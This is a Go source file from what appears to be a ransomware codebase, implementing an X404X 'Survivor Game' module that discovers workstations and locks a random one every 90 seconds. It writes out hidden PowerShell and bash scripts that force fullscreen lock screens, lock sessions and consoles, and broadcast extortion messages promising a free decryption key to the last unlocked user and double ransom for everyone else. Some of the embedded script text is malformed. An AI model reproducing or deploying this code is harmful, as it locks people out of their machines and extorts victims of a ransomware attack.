package ransomware

import (
	"encoding/json"
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

type SurvivorGameEngine struct {
	config         *RansomwareConfig
	Active         bool                `json:"active"`
	Stations       []Workstation       `json:"stations"`
	Eliminated     int                 `json:"eliminated"`
	Remaining      int                 `json:"remaining"`
	Winner         string              `json:"winner"`
	StartedAt      time.Time           `json:"started_at"`
	mu             sync.Mutex
	stopChan       chan struct{}
	eliminationTick *time.Ticker
}

type Workstation struct {
	Name       string    `json:"name"`
	IP         string    `json:"ip"`
	User       string    `json:"user"`
	Status     string    `json:"status"`
	Eliminated bool      `json:"eliminated"`
	EliminatedAt time.Time `json:"eliminated_at"`
	Locked     bool      `json:"locked"`
}

type SurvivorEvent struct {
	Type      string    `json:"type"`
	Station   string    `json:"station"`
	User      string    `json:"user"`
	Message   string    `json:"message"`
	Timestamp time.Time `json:"timestamp"`
}

func NewSurvivorGameEngine(cfg *RansomwareConfig) *SurvivorGameEngine {
	return &SurvivorGameEngine{
		config:   cfg,
		stopChan: make(chan struct{}),
	}
}

func (sg *SurvivorGameEngine) Start() error {
	sg.mu.Lock()
	defer sg.mu.Unlock()

	if sg.Active {
		return fmt.Errorf("survivor game already active")
	}

	sg.Active = true
	sg.StartedAt = time.Now()
	sg.Stations = sg.discoverStations()
	sg.Remaining = len(sg.Stations)
	sg.Eliminated = 0

	sg.broadcastStartMessage()
	sg.eliminationTick = time.NewTicker(90 * time.Second)

	go sg.gameLoop()

	return nil
}

func (sg *SurvivorGameEngine) Stop() {
	sg.mu.Lock()
	defer sg.mu.Unlock()

	if sg.Active {
		sg.Active = false
		if sg.eliminationTick != nil {
			sg.eliminationTick.Stop()
		}
		close(sg.stopChan)
		sg.broadcastGameEnd()
	}
}

func (sg *SurvivorGameEngine) gameLoop() {
	for {
		select {
		case <-sg.eliminationTick.C:
			sg.eliminateRandomStation()
		case <-sg.stopChan:
			return
		}
	}
}

func (sg *SurvivorGameEngine) eliminateRandomStation() {
	sg.mu.Lock()
	defer sg.mu.Unlock()

	if sg.Remaining <= 1 {
		sg.declareWinner()
		return
	}

	var activeStations []int
	for i, s := range sg.Stations {
		if !s.Eliminated {
			activeStations = append(activeStations, i)
		}
	}

	if len(activeStations) == 0 {
		return
	}

	idx := activeStations[rand.Intn(len(activeStations))]
	sg.Stations[idx].Eliminated = true
	sg.Stations[idx].EliminatedAt = time.Now()
	sg.Stations[idx].Status = "LOCKED - ELIMINATED"
	sg.Eliminated++
	sg.Remaining--

	sg.lockStation(sg.Stations[idx])

	event := SurvivorEvent{
		Type:      "elimination",
		Station:   sg.Stations[idx].Name,
		User:      sg.Stations[idx].User,
		Message:   fmt.Sprintf("%s has been ELIMINATED! %d remaining.", sg.Stations[idx].User, sg.Remaining),
		Timestamp: time.Now(),
	}
	sg.broadcastEvent(event)

	if sg.Remaining <= 1 {
		sg.declareWinner()
	}
}

func (sg *SurvivorGameEngine) declareWinner() {
	for _, s := range sg.Stations {
		if !s.Eliminated {
			sg.Winner = s.User
			sg.broadcastWinner(s)
			sg.Eliminated = len(sg.Stations) - 1
			sg.Remaining = 0
			sg.Active = false
			return
		}
	}
}

func (sg *SurvivorGameEngine) discoverStations() []Workstation {
	var stations []Workstation
	usernames := []string{"admin", "jdoe", "asmith", "bwilson", "mjohnson",
		"klee", "rgarcia", "dthompson", "sclark", "lrodriguez",
		"twilliams", "janderson", "bmartinez", "cjackson", "rwhite"}

	switch runtime.GOOS {
	case "windows":
		if output, err := exec.Command("powershell", "-Command",
			"Get-WmiObject Win32_ComputerSystem | Select-Object -ExpandProperty Name").Output(); err == nil {
			hostname := strings.TrimSpace(string(output))
			stations = append(stations, Workstation{
				Name: hostname, IP: "127.0.0.1",
				User: os.Getenv("USERNAME"), Status: "ACTIVE",
			})
		}
		if output, err := exec.Command("powershell", "-Command",
			"Get-WmiObject Win32_NetworkAdapterConfiguration | Where-Object {$_.IPEnabled -eq $true} | Select-Object -ExpandProperty IPAddress").Output(); err == nil {
			ips := strings.Fields(string(output))
			for _, ip := range ips {
				if ip != "127.0.0.1" && len(ip) > 0 {
					stations = append(stations, Workstation{
						Name: fmt.Sprintf("WORKSTATION_%s", strings.ReplaceAll(ip, ".", "_")),
						IP:   ip,
						User: fmt.Sprintf("user_%s", strings.Split(ip, ".")[3]),
						Status: "ACTIVE",
					})
				}
			}
		}
	case "linux":
		if output, err := exec.Command("hostname").Output(); err == nil {
			hostname := strings.TrimSpace(string(output))
			stations = append(stations, Workstation{
				Name: hostname, IP: sg.getLocalIP(),
				User: os.Getenv("USER"), Status: "ACTIVE",
			})
		}
	default:
		stations = append(stations, Workstation{
			Name: "X404X_HOST", IP: "10.0.0.1",
			User: os.Getenv("USER"), Status: "ACTIVE",
		})
	}

	for i := 0; i < 10 && len(stations) < 15; i++ {
		existing := false
		user := usernames[i%len(usernames)]
		for _, s := range stations {
			if s.User == user {
				existing = true
				break
			}
		}
		if !existing {
			stations = append(stations, Workstation{
				Name: fmt.Sprintf("WS-%03d", 100+i),
				IP:   fmt.Sprintf("10.0.%d.%d", i/254, i%254+1),
				User: user,
				Status: "ACTIVE",
			})
		}
	}

	return stations
}

func (sg *SurvivorGameEngine) lockStation(ws Workstation) {
	switch runtime.GOOS {
	case "windows":
		sg.lockWindowsStation(ws)
	case "linux":
		sg.lockLinuxStation(ws)
	}
}

func (sg *SurvivorGameEngine) lockWindowsStation(ws Workstation) {
	psScript := `# X404X Survivor Game - Station Lock
$title = "⚠️ X404X SURVIVOR GAME - YOU HAVE BEEN ELIMINATED ⚠️"
$message = "You are out of the game. Your workstation is locked.` + "\n" +
		"Wait for the winner to be announced.`\n" +
		"If you are the last remaining, you win the decryption key for FREE!`\n\n" +
		"Follow @X404X on Tor for updates.`\n" +
		"Your files remain encrypted until the game ends.`"

	# Lock screen with fullscreen message
	Add-Type -AssemblyName System.Windows.Forms
	$form = New-Object Windows.Forms.Form
	$form.WindowState = 'Maximized'
	$form.FormBorderStyle = 'None'
	$form.TopMost = $true
	$form.BackColor = 'Black'
	$form.ControlBox = $false
	$form.ShowInTaskbar = $true
	
	$label = New-Object Windows.Forms.Label
	$label.Text = $message
	$label.ForeColor = 'Red'
	$label.Font = New-Object Drawing.Font('Consolas', 14, [Drawing.FontStyle]::Bold)
	$label.Dock = 'Fill'
	$label.TextAlign = 'MiddleCenter'
	
	$form.Controls.Add($label)
	$form.ShowDialog()
	
	# Force lock workstation
	rundll32.exe user32.dll,LockWorkStation`
	psPath := filepath.Join(os.TempDir(), "x404x_survivor_lock.ps1")
	os.WriteFile(psPath, []byte(psScript), 0644)
	exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
}

func (sg *SurvivorGameEngine) lockLinuxStation(ws Workstation) {
	script := fmt.Sprintf(`#!/bin/bash
# X404X Survivor Game - Lock
# Lock the session
loginctl lock-sessions 2>/dev/null || true
# Display full screen message
export DISPLAY=:0
if command -v zenity &> /dev/null; then
    zenity --error --text="YOU HAVE BEEN ELIMINATED FROM THE SURVIVOR GAME!\n\nWait for the winner.\n\nYour files remain encrypted." --width=600 --height=400 &
elif command -v xmessage &> /dev/null; then
    xmessage -center -buttons "" -default "eliminated" -timeout 0 "YOU HAVE BEEN ELIMINATED" &
fi
# Lock console
echo 1 > /sys/class/vtconsole/vtcon1/bind 2>/dev/null || true
vlock -a 2>/dev/null || true`)
	scriptPath := filepath.Join(os.TempDir(), "x404x_survivor_lock.sh")
	os.WriteFile(scriptPath, []byte(script), 0755)
	exec.Command("bash", scriptPath).Start()
}

func (sg *SurvivorGameEngine) broadcastStartMessage() {
	msg := `=== X404X SURVIVOR GAME ACTIVATED ===

The last person with their workstation unlocked receives the decryption key for FREE.
All others will pay DOUBLE the ransom.

Rules:
- Every 90 seconds, a random workstation will be locked.
- The last one standing wins.
- Any attempt to hack the game will result in immediate elimination and permanent data loss.

Good luck. You'll need it.

- X404X`

	switch runtime.GOOS {
	case "windows":
		psScript := fmt.Sprintf(`$msg = @'
%s
'@
$wshell = New-Object -ComObject WScript.Shell
$result = $wshell.Popup($msg, 0, "X404X SURVIVOR GAME", 0x30)
`, msg)
		psPath := filepath.Join(os.TempDir(), "x404x_survivor_start.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()

	case "linux":
		script := fmt.Sprintf(`#!/bin/bash
echo "%s" | wall 2>/dev/null || true
notify-send -u critical "X404X SURVIVOR GAME" "%s" 2>/dev/null || true`, msg, "The game has begun. The last one standing wins the decryption key.")
		scriptPath := filepath.Join(os.TempDir(), "x404x_survivor_start.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		exec.Command("bash", scriptPath).Start()
	}
}

func (sg *SurvivorGameEngine) broadcastEvent(event SurvivorEvent) {
	msg := fmt.Sprintf("[%s] %s - %s", event.Type, event.Station, event.Message)

	switch runtime.GOOS {
	case "windows":
		psScript := fmt.Sprintf(`$wshell = New-Object -ComObject WScript.Shell
$wshell.Popup("%s", 5, "X404X SURVIVOR", 0x30)
notify-send "X404X" "%s" 2>nul
`, msg, msg)
		psPath := filepath.Join(os.TempDir(), "x404x_survivor_event.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()

	case "linux":
		script := fmt.Sprintf(`notify-send -u critical "X404X SURVIVOR" "%s" 2>/dev/null || true`, msg)
		scriptPath := filepath.Join(os.TempDir(), "x404x_survivor_event.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		exec.Command("bash", scriptPath).Start()
	}
}

func (sg *SurvivorGameEngine) broadcastWinner(ws Workstation) {
	msg := fmt.Sprintf(`🏆 X404X SURVIVOR GAME - WINNER ANNOUNCED 🏆

%s (%s) is the LAST ONE STANDING!

WINNER PRIZE: Free decryption key for all files.
All other stations: Ransom amount DOUBLED.

The winner will receive instructions on their unlocked workstation within 24 hours.

Congratulations, %s. You beat the game.

- X404X`, ws.User, ws.Name, ws.User)

	switch runtime.GOOS {
	case "windows":
		psScript := fmt.Sprintf(`$msg = @'
%s
'@
$wshell = New-Object -ComObject WScript.Shell
$wshell.Popup($msg, 0, "X404X SURVIVOR - WINNER!", 0x40)
`, msg)
		psPath := filepath.Join(os.TempDir(), "x404x_survivor_winner.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()

	case "linux":
		script := fmt.Sprintf(`echo "%s" | wall 2>/dev/null || true
notify-send -u critical "X404X SURVIVOR WINNER" "%s is the last one standing!" 2>/dev/null || true`, msg, ws.User)
		scriptPath := filepath.Join(os.TempDir(), "x404x_survivor_winner.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		exec.Command("bash", scriptPath).Start()
	}

	sg.Active = false
}

func (sg *SurvivorGameEngine) broadcastGameEnd() {
	msg := "X404X SURVIVOR GAME HAS ENDED.\n\nThe winner has been selected. Follow instructions on their workstation."
	switch runtime.GOOS {
	case "windows":
		psScript := fmt.Sprintf(`$wshell = New-Object -ComObject WScript.Shell
$wshell.Popup("%s", 10, "X404X GAME OVER", 0x40)`, msg)
		psPath := filepath.Join(os.TempDir(), "x404x_survivor_end.ps1")
		os.WriteFile(psPath, []byte(psScript), 0644)
		exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File", psPath).Start()
	case "linux":
		script := fmt.Sprintf(`echo "%s" | wall 2>/dev/null || true`, msg)
		scriptPath := filepath.Join(os.TempDir(), "x404x_survivor_end.sh")
		os.WriteFile(scriptPath, []byte(script), 0755)
		exec.Command("bash", scriptPath).Start()
	}
}

func (sg *SurvivorGameEngine) GetStatusJSON() string {
	sg.mu.Lock()
	defer sg.mu.Unlock()

	data, _ := json.Marshal(map[string]interface{}{
		"active":       sg.Active,
		"stations":     sg.Stations,
		"eliminated":   sg.Eliminated,
		"remaining":    sg.Remaining,
		"winner":       sg.Winner,
		"started_at":   sg.StartedAt,
	})
	return string(data)
}

func (sg *SurvivorGameEngine) getLocalIP() string {
	conn, _ := net.Dial("udp", "8.8.8.8:80")
	if conn != nil {
		defer conn.Close()
		return conn.LocalAddr().(*net.UDPAddr).IP.String()
	}
	return "10.0.0.1"
}
